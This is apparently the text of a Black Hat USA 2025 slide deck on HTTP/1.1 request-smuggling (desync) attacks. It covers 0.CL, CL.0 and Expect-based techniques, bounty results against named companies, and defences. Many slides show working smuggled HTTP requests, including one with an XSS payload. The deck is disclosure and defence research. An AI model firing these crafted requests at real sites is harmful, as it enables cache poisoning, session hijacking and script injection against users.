---
title: "HTTP1.1 Must Die! The Desync Endgame"
speakers: ["James Kettle"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/James Kettle_HTTP1.1 Must Die! The Desync Endgame.pdf"
pages: 50
sha256: "2c00acad21e8316aa57ddfb971fa02b92b56e12852b55b59c0219fdb035e787b"
text_chars: 19450
ocr_pages: 0
has_ocr: false
redacted_secrets: 0
ocr_confidence: null
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-12T05:13:16Z"
---
# HTTP1.1 Must Die! The Desync Endgame

**Speakers:** James Kettle  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/James Kettle_HTTP1.1 Must Die! The Desync Endgame.pdf` (50 pages)


## Slide 1

# HTTP/1.1 Must Die!

the desync endgame James Kettle

## Slide 2

HTTP/1's fatal flaw: where does the current request end… and the next request start?

HTTP/2

**Front-end**

HTTP/1.1

Back-end

Use HTTP/2 here

## Slide 3

###### **The desync endgame**

Blocked by regex

\```
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 35
0
\```

\```
200 OK
\```

\```
GET /robots.txt HTTP/1.1
X: y
\```

\```
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 35
0
GET /robots.txt HTTP/1.1
X: yGET / HTTP/1.1
Host: example.com
\```

\```
GET / HTTP/1.1
Host: example.com
\```

Missed due to `HTTP/1.1 200 OK` race condition `Disallow: /`

/robots.txt gadget fails on this target

## Slide 4

###### **Change tactics, find bugs**

\```
GET /assets/icon.png HTTP/2
Host: <redacted>
GET /assets HTTP/1.1
Host: psres.net
X: y
\```

\```
HTTP/2 200 OK
\```

_In collaboration with_ Wannes Verwimp, Cresco Cybersecurity

\```
GET /??? HTTP/1.1HTTP/2 302 Found
Host: <cdn.redactedbank.com>
GET /assets/ HTTP/1.1
Host: psres.net
Referer: https://<cdn.redactedbank.com>/
\```

\```
HTTP/2 302 Found
Location: https://psres.net/assets/
\```

## Slide 5

**Front-end Back-end**

## Slide 6

Tier 1 Tier 2 Tier 3

## Slide 7

###### **Change tactics, find bugs**

\```
GET /assets/icon.png HTTP/2
Host: <redacted>
GET /assets HTTP/1.1
Host: psres.net
X: x
\```

\```
GET /assets/icon.png?cb=123 HTTP/2
Host: <redacted>
GET /assets HTTP/1.1
Host: psres.net
X: x
\```

This works

`HTTP/2 200 OK Cf-Cache-Status:` `HIT` This fails

\```
HTTP/2 200 OK
Cf-Cache-Status: MISS
\```

## Slide 8

Tier 1 Tier 2 Tier 3 Tier 4
(cache)
HTTP/2 HTTP/1.1 HTTP/2
Tier 3+
CVE-2025-4366 Vulnerable websites: 24,000,000 +$7,000

## Slide 9

###### **"HTTP/1.1 is simple" and other lies**

A HTTP/1 request can't directly target an intermediary

A HTTP/1 desync can only be caused by a parser discrepancy A HTTP/1 response contains everything a proxy needs to parse it A HTTP/1 response can only contain one header block

A complete HTTP/1 response requires a complete request

## Slide 10

#### HTTP/1.1 must die

_more desync attacks are coming_

## Slide 11

###### **Outline**

- Winning the desync endgame

- • 0.CL desync attacks

- Expect-based desync attacks

- Defense – how secure is HTTP/2+?

- Q&A

Further research idea

## Slide 12

### Winning the desync endgame

Rule 0) don't use transfer-encoding

## Slide 13

###### **Detecting parser discrepancies**

**Inspiration/concept** Practical HTTP Header Smuggling Daniel Thatcher, BHEU 2021

**HTTP Request Smuggler v3.0**

\```
PermutationHeader
EveryContent-Length
obfuscation Host
techniqueMax-Forwards
Range
Expect
\```

\```
Classification
HIDDEN, VISIBLE,
IGNORED, BLOCKED,
DISCREPANCY
\```

\```
Style
Single
Duplicate
POST
GET
\```

1. Explore alternate detection headers 2. Add new permutations from httpgarden

## Slide 14

###### **Detecting Visible-Hidden (V-H)**

`Host: <redacted-food-corp> HTTP/1.1 200 OK Xost: <redacted-food-corp> HTTP/1.1 503 Service Unavailable Host: <redacted-food-corp> HTTP/1.1 400 Bad Request Xost: <redacted-food-corp> HTTP/1.1 503 Service Unavailable` Classification: DISCREPANCY **{front-end}-{back-end} V** (Visible) **H** (Hidden) Type: Visible-Hidden (V-H)

## Slide 15

###### **Turning V-H into a CL.0 desync**

\```
GET /style.css HTTP/1.1
Host: <food-corp>
Foo: bar
 Content-Length: 23
GET /404 HTTP/1.1
X: y
GET / HTTP/1.1
Host: <food-corp>
\```

`GET /style.css HTTP/1.1 Host: <food-corp> Foo: bar Content-Length: 23 HTTP/1.1 200 OK GET /404 HTTP/1.1 X: yGET / HTTP/1.1 Host: <food-corp> HTTP/1.1 404 Not Found` **{front-end}.{back-end} CL** (Content-Length) **TE** (Transfer-Encoding) **0** (Implicit-zero) **H2** (HTTP/2's built-in length)

## Slide 16

###### **Detecting V-H with an** **_invalid, duplicate_ header**

Understand the codes `HTTP/1.1 400 Bad Request` `HTTP/1.1 412 Precondition Failed` `HTTP/1.1 200 OK HTTP/1.1 412 Precondition Failed` `HTTP/1.1 200 OK` `HTTP/1.1 501 Not Implemented ABC=DEFPOST not supported for current URL.`

\```
Host: x/x
Xost: x/x
Host: x/x
Xost: x/x
\```

\```
POST /js/jquery.min.js HTTP/1.1
Host: <redacted-vpn.bank.com>
Junk: bar
 Content-Length: 7
ABC=DEF
\```

## Slide 17

###### **Predicting vulnerabilities**

\```
"a recipient MAY recognize a single LF as a line
terminator" – RFC 9122
EarlyBodyPair("A: B\n\n{detectionHeader}",
expectedOutcome=PermutationOutcome.HIDDEN)
POST / HTTP/1.1\r\nHTTP/1.1 100 Continue
Content-Length: 40\r\n
A: B\r\nHTTP/1.1 302 Found
\n
Expect: 100-continue\r\n
\```

\```
HTTP/1.1 100 Continue
HTTP/1.1 302 Found
\```

Classification: VISIBLE

CVE pending

## Slide 18

###### **Detecting Hidden-Visible:  ALB->IIS**

\```
Host: foo/bar 400 Bad Request, Server: awselb/2.0
Zost: foo/bar 200 OK, -no server header-
Host : foo/bar 400 Bad Request, Server: Microsoft-HTTPAPI/2.0
Zost : foo/bar 200 OK, -no server header-
\```

AWS HTTP Desync Guardian

- Tries to block desync attacks

- Bypassed for a H2.TE desync in _The Single-Packet Shovel_ by Thomas Stacey

- Still doesn't block header injection by default `Set routing.http.drop_invalid_header_fields.enabled Set routing.http.desync_mitigation_mode = strictest`

Adopting cloud proxies imports other companies' technical debt into your security posture

1. Improve response diffing 2. Explore header injection

## Slide 19

###### **Turning H-V into a desync**

`Host: foo/bar Xost: foo/bar Host: foo/bar Xost: foo/bar Transfer-Encoding: chunked` Is there another way?

`HTTP/1.1 200 OK` `HTTP/1.1 302 Moved` `HTTP/1.1 400 Bad Request HTTP/1.1 302 Moved` Can't CL.TE desync `--connection reset—-`

## Slide 20

## 0.CL desync attacks

## Slide 21

###### **The 0.CL deadlock**

\```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 23
GET /404 HTTP/1.1
X: Y
\```

Front-end interprets this as a second request

\```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 23
\```

\```
HTTP/1.1 504 Gateway Timeout
\```

How can we escape the 0.CL deadlock?

## Slide 22

Do not use the following reserved names for the name of a file: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, COM¹, COM², COM³, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9, LPT¹, LPT², and LPT³.

https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file

## Slide 23

###### **Escaping the 0.CL deadlock with an early-response gadget**

\```
GET /con HTTP/1.1
Host: <redacted>
Content-Length:
 7
\```

\```
GET /con HTTP/1.1
Host: <redacted>
Content-Length:
 7
\```

\```
HTTP/1.1 200 OK
\```

\```
GET / HTTP/1.1
Host: <redacted>
\```

\```
GET / HTTP/1.1
Host: <redacted>
\```

`HTTP/1.1 400 Bad Request` Flagged by HTTP Request Smuggler as "Mystery 400" since 2019

**Early-response gadgets** Nginx: Any static file IIS: Reserved filename Other: Static file or server-level redirect

Find an early-response gadget for Apache

## Slide 24

###### **Proving the concept**

`POST /con HTTP/1.1 POST /con HTTP/1.1 Host: <redacted> Host: <redacted> Content-Length: Content-Length: 20 HTTP/1.1 200 OK 20 GET / HTTP/1.1` Not a realistic `GET / HTTP/1.1 X: yGET /wrtz HTTP/1.1 X: yGET /wrtz HTTP/1.1` victim request `Host: <redacted> Host: <redacted> HTTP/1.1 302 Found Location: /Logon?ReturnUrl=%2fwrtz` How can we exploit a real victim?

## Slide 25

###### **Converting 0.CL to CL.0 with a double desync – the hard way**

\```
POST /nul HTTP/1.1POST /nul HTTP/1.1
Content-length: Content-length:
 39 39
HTTP/1.1 200 OK
POST / HTTP/1.1
POST / HTTP/1.1
Content-Length: 64
Content-Length: 64
HTTP/1.1 200 OKGET / HTTP/1.1
GET / HTTP/1.1
Host: <redacted>
Host: <redacted>
GET /wrtz HTTP/1.1
GET /wrtz HTTP/1.1
Foo: barGET / HTTP/1.1
Foo: bar
Host: <redacted>
HTTP/1.1 302 Found
GET / HTTP/1.1
Host: <redacted>Location: /Logon?ReturnUrl=%2fwrtz
\```

## Slide 26

###### **Converting 0.CL to CL.0 with a double desync – the hard way**

\```
POST /nul HTTP/1.1
Content-length:
 39
\```

\```
POST / HTTP/1.1
Content-Length: 64
\```

\```
POST /nul HTTP/1.1
Content-length:
 39
\```

\```
HTTP/1.1 200 OK
\```

`POST / HTTP/1.1` Front-end inserted header breaks the `Content-Length: 64` attack `?` `?????: ?????`

\```
GET / HTTP/1.1
Host: <redacted>
GET /wrtz HTTP/1.1
Foo: bar
\```

\```
400 Bad Request
\```

\```
GET / HTTP/1.1
Host: <redacted>
GET /wrtz HTTP/1.1
Foo: bar
\```

## Slide 27

###### **Converting 0.CL to CL.0 with a double desync – the easy way**

\```
POST /nul HTTP/1.1
Content-length:
 41
GET /z HTTP/1.1
Content-Length: 62
X: yGET /y HTTP/1.1
???????????: ?????????
POST /index.asp HTTP/1.1
Content-Length: 201
Password=zwrt
\```

\```
GET / HTTP/1.1
???????????: ?????????
\```

\```
HTTP/1.1 200 OK
\```

Header injection here doesn't affect offsets `HTTP/1.1 200 OK`

\```
Invalid input:
  zwrtGET/HTTP/1.1Host:
<redacted>Connection:keep-aliveAccept-Enc
oding:identity
\```

## Slide 28

###### **0.CL to CL.0 HEAD exploit**

\```
POST /nul HTTP/1.1
Host: <redacted>
Content-length:
 42
\```

\```
GET /aa HTTP/1.1
Content-Length: 82
X: yGET /bb HTTP/1.1
Host: <redacted>
HEAD /index.asp HTTP/1.1
Host: <redacted>
GET /?<script>alert(1 HTTP/1.1
X: Y
GET / HTTP/1.1
Host: <redacted>
\```

`HTTP/1.1 200 OK HTTP/1.1 200 OK Location: /Logon?returnUrl=/bb` +$7,500 EXNESS +$900 +$586 +$370 `HTTP/1.1 200 OK` +$2,789 `Content-Length: 56670 Content-Type: text/html` +$500 +$2,000 `HTTP/1.1 302 Found Location: /?return=/<script>alert(1…` =$ **21,645**

## Slide 29

###### **A partial history of desync attacks**

2004: "HTTP Request Smuggling" – _Watchfire (largely forgotten)_ 2016: "Hiding wookies in HTTP" – _Regilero (largely ignored)_ 2019: Exploit header parser discrepancies (CL.TE, TE.CL) 2021: Exploit HTTP/2 downgrading (H2.CL, H2.TE) 2022: Exploit endpoints that ignore CL (CL.0, H2.0, CSD) Send "Expect: 100-continue", see what happens (0 findings) 2024: Exploit dechunking (TE.0) _- sw33tLie/bsysop/medusa_ 2025 _:_ Exploit chunk extensions – _Jeppe Weikop_ 2025: 0.CL desync attacks More desync attacks are always coming

## Slide 30

## Expect-based desync attacks

## Slide 31

###### **The 'Expect' complexity bomb**

###### **No Expect support**

\```
while (bodyStart == -1 && !shouldAbandonAttack()) {
val len = socket.getInputStream().read(readBuffer)
if(len == -1) {
\```

###### **Partial Expect support**

\```
var consumeFirstBlock = buffer.startsWith("HTTP/1.1 100")
var ateContinue = false
var continueBlock = ""
\```

\```
break
\```

\```
}
endTime = System.nanoTime()
\```

\```
val read = Utils.bytesToString(readBuffer.copyOfRange(0, len))
    triggerReadCallback(read)
buffer += read
    bodyStart = buffer.indexOf("\r\n\r\n")
}
\```

\```
while ((bodyStart == -1 || (consumeFirstBlock && !ateContinue)) && !shouldAbandonAttack()) {
try {
val len = socket.getInputStream().read(readBuffer)
if(len == -1) {
break
}
endTime = System.nanoTime()
\```

\```
val read = Utils.bytesToString(readBuffer.copyOfRange(0, len))
        triggerReadCallback(read)
buffer += read
        consumeFirstBlock = buffer.startsWith("HTTP/1.1 100")
bodyStart = buffer.indexOf("\r\n\r\n")
\```

\```
if (consumeFirstBlock && bodyStart != -1 && !ateContinue && !ignoreLength) {
consumeFirstBlock = false
ateContinue = true
continueBlock = buffer.substring(0, bodyStart+4)
buffer = buffer.substring(bodyStart+4)
bodyStart = buffer.indexOf("\r\n\r\n")
        }
    } catch (ex: SocketTimeoutException) {
break
}
}
\```

\```
if (buffer.isEmpty() && ateContinue) {
buffer = continueBlock
    continueBlock = ""
bodyStart = buffer.length
// todo handle missing body
}
\```

## Slide 32

###### **An introduction to Expect**

\```
POST / HTTP/1.1HTTP/1.1 100 Continue
Expect: 100-continue
Content-Length: 7HTTP/1.1 200 OK
…
ABCDEFGGET /404 HTTP/1.1HTTP/1.1 404 Not Found
Host: example.com
\```

What if the front-end doesn't {support Expect, see Expect, parse the value as 100-continue}? What if the back-end doesn't {support Expect, see Expect, parse the value as 100-continue}? What if the back-end responds early?

What if the client doesn't wait for 100-continue?

## Slide 33

###### **The 'Expect' complexity bomb**

`HEAD /<redacted> HTTP/1.1 Host: api.<redacted> Content-Length: 6 HTTP/1.1 200 OK` HEAD works `ABCDEF GET /<redacted> HTTP/1.1 Host: api.<redacted> HTTP/1.1 100 Continue Content-Length: 6` Expect works `Expect: 100-continue HTTP/1.1 200 OK ABCDEF HEAD /<redacted> HTTP/1.1 HTTP/1.1 100 Continue Host: api.<redacted>` HEAD + Expect `Content-Length: 6 HTTP/1.1 504 Gateway Timeout` deadlocks `Expect: 100-continue ABCDEF`

## Slide 34

###### **Expect memory leaks**

\```
POST / HTTP/1.1
Host: <redacted>
Expect: 100-continue
Content-Length: 1
X
\```

\```
HTTP/1.1 401 Unauthorized
Www-Authenticate: Bearer
HTTP/1.1 100 ContinTransfer-
EncodingzxWthTQmiI8fJ4oj9fzE"
X-: chunked
\```

\```
HTTP/1.1 401 Unauthorized
Www-Authenticate: Bearer
HTTP/1.1 100 ContinTransfer-EncodingzxWthTQm145
\```

\```
POST / HTTP/1.1
Host: <redacted>
Expect: 100-continue
Content-Length: 1
X
\```

\```
HTTP/1.1 404 Not Found
HTTP/1.1 100 Continue
d
\```

\```
Ask the hotel which eHTTP/1.1 404 Not Found
HTTP/1.1 100 Continue
d
\```

## Slide 35

###### **Bypassing response header removal**

`HTTP/1.1 200 OK POST /_next/static/foo.js HTTP/1.1 Server: Netlify Host: <redacted-netlify> X-Nf-Request-Id: <redacted> HTTP/1.1 100 Continue Server: Netlify POST /_next/static/foo.js HTTP/1.1 X-Nf-Request-Id: <redacted> Host: <redacted-netlify> Expect: 100-continue HTTP/1.1 200 OK X-Bb-Account-Id: <redacted> X-Bb-Cache-Gen: <redacted> X-Bb-Deploy-Id: <redacted> X-Bb-Site-Domain-Id: <redacted> X-Bb-Site-Id: <redacted>` _"this information is_ `X-Cnm-Signal-K: <redacted> X-Nf-Cache-Key: <redacted> X-Nf-Ats-Version: <redacted>` _provided by design"_ `X-Nf-Cache-Info: <redacted>` **+$200** `X-Nf-Cache-Result: <redacted> X-Nf-Proxy-Header-Rewrite: <redacted> X-Nf-Proxy-Version: <redacted> X-Nf-Srv-Version: <redacted>`

## Slide 36

_"have you seen anything like this before?"_ **`Expect: 100-continue`** _Paolo 'sw33tLie' Arnolfo Guillermo 'bsysop' Gregorio Mariani  'Medusa' Francesco_

**_Unveiling TE.0 HTTP Request Smuggling_**

## Slide 37

###### **0.CL desync with vanilla Expect – T-Mobile**

**+$12,000 = $33,845**

`GET /logout HTTP/1.1 Host: <redacted>.t-mobile.com Expect: 100-continue` +207 internal `Content-Length: 291` header offset `GET /logout HTTP/1.1 Host: <redacted>.t-mobile.com Content-Length: 100 GET / HTTP/1.1 Host: <redacted>.t-mobile.com GET https://psres.net/assets HTTP/1.1 X: y`

\```
HTTP/1.1 404 Not Found
\```

\```
HTTP/1.1 200 OK
\```

\```
HTTP/1.1 301 Moved Permanently
GET / HTTP/1.1
Host: <redacted>.t-mobile.comLocation: https://psres.net/…
\```

## Slide 38

###### **0.CL desync with obfuscated Expect - Gitlab**

###### **+$7,110 = $40,955**

`GET / HTTP/1.1 Content-Length: 686 HTTP/1.1 200 OK Expect: y 100-continue` +648 offset `GET / HTTP/1.1 Content-Length: 86 GET / HTTP/1.1 HTTP/1.1 200 OK Host: h1.sec.gitlab.net GET / HTTP/1.1` _27,000 requests later…_ `Host: h1.sec.gitlab.net GET /??? HTTP/1.1 HTTP/1.1 200 OK GET / HTTP/1.1 HTTP/1.1 302 Found … Location: https://storage.googleapis.com/glse c-h1-attachments-live/63f7-dcde-b2d2e6a1…`

## Slide 39

###### **CL.0 desync with vanilla Expect - Netlify**

**+$0**

_"Websites utilizing Netlify are out of scope."_ `HTTP/1.1 404 Not Found`

`POST /images/ HTTP/1.1 Host: <redacted-netlify> Expect: 100-continue Content-Length: 57 HTTP/1.1 404 Not Found GET /letter-picker HTTP/1.1 Host: <redacted-netlify> POST /authenticate HTTP/1.1 HTTP/1.1 200 OK Host: ??? … <title>Letter Picker Wheel HTTP/1.1 200 OK GET / HTTP/1.1 … Host: <redacted-netlify> "{\"token\":\"eyJhbGciOiJ…` Vulnerable websites: >1,000,000?

\```
HTTP/1.1 200 OK
…
<title>Letter Picker Wheel
HTTP/1.1 200 OK
…
"{\"token\":\"eyJhbGciOiJ…
\```

## Slide 40

###### **CL.0 desync via obfuscated Expect - LastPass**

###### **+$5,000 = $45,955**

\```
OPTIONS /anything HTTP/1.1
Host: auth.lastpass.com
Expect:
100-continue
Content-Length: 39
GET / HTTP/1.1
Host: www.sky.com
X: y
\```

\```
HTTP/1.1 404 Not Found
\```

\```
GET /anything HTTP/1.1
Host: auth.lastpass.com
\```

\```
HTTP/1.1 200 OK
Discover TV & Broadband
Packages with Sky
\```

## Slide 41

_We can hack…_ **`example.com`**

## Slide 42

###### _Which would you choose?_

$8,500 $3,000 $150 $5,000 $500 $2,000 $10,000 $600 $7,500 $10,000 $9,000 $6,000 $5,000 $4,500 $3,500 $3,000 $6,000 Report to companies $2,600 $2,050 $1,750 $850 $500 + More money + Kills HTTP/1.1 better $396 $300 $175 $900 $2,500 -  More work $1,700 $650 $540 $216 $6,000 **+$230,000 = $276,000** -  CDN does not like this $2,000 $2,000 $8,000 $2,000 -  Risks technique leak $2,500 $1,750 $20,000 $5,500 $2,000 $500 $7,500 $2,500 $800 $765 $1,200 $1,000 $54 $4,500 Number of bounties: 74 $1,000 $5,500 $54 $2,100 $200 Average bounty: $3,000 $4,100 $4,100 $1,500 $3,000 Biggest bounty: $20,000 $3,000 $300 $2,500 $54 $100 Total: $221,000 $200 $12,500 $500 $350 $3,500 $54 $4,774 $3,000 $4,300, $2,500

###### Report to CDN

- +   Less work

+   Makes CDN happy

- Less money - Low visibility for companies

- Risk of NDA

Payout: $9,000

CVE-2025-32094

## Slide 43

Defense

## Slide 44

###### **Why upstream HTTP/1.1 must die**

**All these attacks stem from HTTP/1's fatal flaw**

**The fatal flaw: tiny bug = complete site takeover**

- Parser discrepancies are critical

- But not just parser discrepancies

**HTTP/1 is only simple if you're not proxying**

- RFC landmines like Transfer-Encoding, Expect, Connection, HEAD, Range…

- HTTP/2 downgrading makes the situation even worse

- **We struggle to patch HTTP/1**

- Normalization breaks too much, Regex-based defences aren't sufficient,

More desync attacks are coming

## Slide 45

###### **How secure is upstream HTTP/2+?**

**HTTP/2+ does not have the fatal flaw**

- **HTTP/2 makes most implementation bugs lower-impact** • DoS, connection contamination, state table corruption

- **HTTP/1 is old, but not hardened**

- HTTP/1 in 2025 is 'hardened' like C in 2002

**HTTP/2 downgrading is not secure**

- HTTP/2 must be _upstream_ or _end-to-end_

- • See "HTTP/2: the sequel is always worse"

## Slide 46

###### How to defeat request smuggling

**Front-end**

**Back-end**

HTTP/1 is ~OK here

Use HTTP/2 here

**Upstream HTTP/2 support:** HAProxy, F5 Big-IP, Google Cloud, Imperva, AWS ALB, Cloudflare*, Apache* nginx, Akamai, CloudFront, Fastly

## Slide 47

###### **So you're stuck with HTTP/1.1?**

###### **Short-term mitigations**

- Enable normalization/validation on front-end

- Perform regular scans using HTTP Request Smuggler 3.0

- • Avoid niche webservers – Apache & nginx are lower risk

**Painful but effective solutions**

- Remove all proxy layers

- -or-

- Disable upstream connection reuse & don't trust internal headers

## Slide 48

###### **How you can help kill HTTP/1.1**

#1 problem: poor awareness of the danger of upstream HTTP/1.1 Show the world how broken it is

   - Break, fix, and share: _more desync attacks are coming_

- Embrace the desync endgame • Adapt techniques and tools

- • Don't get regexed

- • Don't settle for the state of the art.

   - Try it and see what happens

## Slide 49

###### References & further reading

###### **http1mustdie.com**

**Whitepaper, lab & code** portswigger.net/research/http1-must-die Header smuggling github.com/PortSwigger/http-request-smuggler portswigger.net/web-security/request-smuggling/browser/0-cl github.com/PortSwigger/turbo-intruder 0cl-{poc,find-offset,exploit} **References & further reading:** intruder.io/research/practical-http-header-smuggling assured.se/posts/the-single-packet-shovel-desync-powered-request-tunnelling mattermost.com/blog/a-dos-bug-thats-worse-than-it-seems/ CVE-2025-4366, blog.cloudflare.com/resolving-a-request-smuggling-vulnerability-in-pingora/ CVE-2025-32094 , Akamai URL pending Supported charity: 42ndstreet.org.uk

## Slide 50

##### **http1mustdie.com**

Upstream HTTP/1.1 is insecure - more desync attacks are coming **If we want a secure web, HTTP/1.1 must die.**

**Together, we can kill it.**

@albinowax Email: james.kettle@portswigger.net Paper: https://portswigger.net/research/http1-must-die
